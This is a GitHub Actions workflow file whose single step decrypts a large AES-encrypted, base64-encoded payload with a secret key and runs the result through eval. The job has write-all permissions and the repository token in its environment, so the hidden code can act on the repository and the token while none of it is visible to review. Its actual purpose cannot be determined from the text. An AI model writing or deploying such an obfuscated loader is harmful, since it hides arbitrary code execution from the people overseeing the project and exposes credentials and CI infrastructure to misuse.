name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="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"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
